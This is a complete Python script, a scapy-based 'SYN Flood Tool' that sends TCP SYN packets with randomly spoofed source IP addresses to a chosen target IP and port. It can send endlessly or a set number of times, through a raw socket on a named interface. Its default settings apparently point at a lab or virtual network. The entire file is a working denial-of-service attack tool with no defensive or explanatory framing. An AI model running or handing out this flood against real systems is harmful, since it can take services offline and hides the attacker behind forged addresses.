#!/usr/bin/python3
# Emre Ovunc
# info@emreovunc.com
# Python3 SYN Flood Tool CMD v2.0.1

from sys import stdout
from scapy.all import *
from random import randint
from argparse import ArgumentParser
from scapy.config import conf
s = conf.L2socket(iface='veth251')


def randomIP():
	ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000, 9000)
	return x


def SYN_Flood(dstIP, dstPort, counter, iface):
	total = 0
	print ("IPv4 Packets are sending ...")
	if counter == 0:
		while True:
			s_port = randInt()
			s_eq = randInt()
			w_indow = randInt()
			
			IP_Packet = IP ()
			IP_Packet.src = randomIP()
			IP_Packet.dst = dstIP

			TCP_Packet = TCP ()
			TCP_Packet.sport = s_port
			TCP_Packet.dport = int(dstPort)
			TCP_Packet.flags = "S"
			TCP_Packet.seq = s_eq
			TCP_Packet.window = w_indow

			payload = "Flood" * random.randint(1,100)

			# sendp(Ether()/ IP_Packet / TCP_Packet / payload, iface=iface)
			s.send(Ether()/ IP_Packet/TCP_Packet/payload)
			total+=1
			stdout.write("\rTotal packets sent: %i" % total)
			stdout.flush()
	else:
		for x in range (0, counter):
			s_port = randInt()
			s_eq = randInt()
			w_indow = randInt()
			
			IP_Packet = IP ()
			IP_Packet.src = randomIP()
			IP_Packet.dst = dstIP

			TCP_Packet = TCP ()
			TCP_Packet.sport = s_port
			TCP_Packet.dport = int(dstPort)
			TCP_Packet.flags = "S"
			TCP_Packet.seq = s_eq
			TCP_Packet.window = w_indow

			payload = "Flood" * random.randint(1,100)

			s.send(Ether()/ IP_Packet/TCP_Packet/payload)
			total+=1

		stdout.write("\nTotal packets sent: %i\n" % total)


def main():
	parser = ArgumentParser()
	parser.add_argument('--target', '-t', help='target IP address', default='10.20.30.40')
	parser.add_argument('--port', '-p', help='target port number', default=8080)
	parser.add_argument('--count', '-c', help='number of packets')
	parser.add_argument('--interface', '-i', help='interface to send packets', default='veth251')

	args = parser.parse_args()

	if args.target is not None:
		if args.port is not None:
			if args.count is None:
				print('[!]You did not use --counter/-c parameter, so endless packet will be sent..')
				SYN_Flood(args.target, args.port, 0, args.interface)
			else:
				SYN_Flood(args.target, args.port, int(args.count), args.interface)

		else:
			print('[-]Please, use --port/-p to give target\'s port!')
			print('[!]Example: -p 445')
			print('[?] -h for help')
			exit()
	else:
		print('''usage: py3_synflood_cmd.py [-h] [--target TARGET] [--port PORT]
                           [--count COUNT] [--version]
optional arguments:
  -h, --help            show this help message and exit
  --target TARGET, -t TARGET
                        target IP address
  --port PORT, -p PORT  target port number
  --count COUNT, -c COUNT
                        number of packets
  --version, -v         show program's version number and exit''')
		exit()

main()